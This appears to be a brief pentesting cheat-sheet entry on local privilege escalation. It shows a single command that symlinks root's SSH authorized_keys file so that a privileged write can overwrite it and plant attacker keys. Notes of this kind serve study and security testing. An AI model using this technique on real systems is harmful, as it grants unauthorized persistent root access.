# Privileged Write

## Misuse of symlinks
#lpe #writeasroot #symlinks #ln
If you can write as root, you can do
`ln -s /root/.ssh/authorized_keys authorized_keys` 
and then write to `authorized_keys` as admin, overwriting the original one.